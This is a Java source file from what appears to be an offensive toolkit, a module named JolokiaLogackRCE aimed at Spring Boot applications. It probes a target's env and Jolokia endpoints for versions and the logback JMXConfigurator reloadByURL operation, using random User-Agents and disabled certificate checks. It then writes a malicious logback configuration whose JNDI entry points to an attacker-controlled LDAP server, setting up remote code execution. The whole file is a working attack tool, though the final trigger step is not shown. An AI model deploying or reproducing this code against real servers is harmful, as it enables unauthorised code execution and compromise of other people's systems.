package src.main.module;

import src.main.common.UA_Config;

import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class JolokiaLogackRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    public String jndipayload = "<configuration>\n" +
            "    <insertFromJNDI env-entry-name=\"ldap://%s:1389/src.main.template.JNDIObject.JNDIObject\" as=\"appName\" />\n" +
            "</configuration>";
    public JolokiaLogackRCE(String address,String vpsIP,String vpsPort){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }

    public void Result1() {
        String llib = "jdk";
        String llib1 = "jolokia-core";
        String api = "/jolokia";
        String site = address + "/env";
        String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
        String reloURL = "reloadByURL";
        String ua = "";
        String data = "";
        disableSSLVerification();
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent", ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)){
                String regex = llib+ "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1+ "-(\\d+\\.\\d+\\.\\d)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    System.out.println(text);
                    text = "当前jolokia-core版本为: " + matcher1.group(1);
                    System.out.println(text);
                    URL obj1 = new URL(address + "/jolokia/list");
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent", ua);
                    conn1.setRequestMethod("GET");
                    conn1.setDoOutput(true);
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(logbak)) && response1.toString().contains(reloURL)) {
                        text = "存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        System.out.println(text);
                        FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/JolokiaLogback.xml");
                        Scanner sc = new Scanner(System.in);
                        data = String.format(jndipayload, vpsIP);
                        writer.write(data);
                        sc.close();
                        writer.close();
                        text = "JolokiaLogback.xml文件写入成功";
                        System.out.println(text);

                    }else{
                        text = "未找到 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
                        System.out.println(text);
                    }
                }else{
                    text = "未找到依赖";
                    System.out.println(text);
                }
            }else {
                text = "发起请求失败";
                System.out.println(text);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public void Result2() {
    }
    public void Exp(){
        String api = "/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                text = "当前版本为springboot2";
                System.out.println(text);
//                callback.onResult(text);
                Result2();
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                System.out.println(text);
//                callback.onResult("当前版本为springboot1");
                Result1();
            }else{
                text = "未识别springboot版本";
//                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测springboot版本异常";
//            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        JolokiaLogackRCE jl = new JolokiaLogackRCE("http://127.0.0.1:9094","127.0.0.1","80");
        jl.Exp();
    }
}
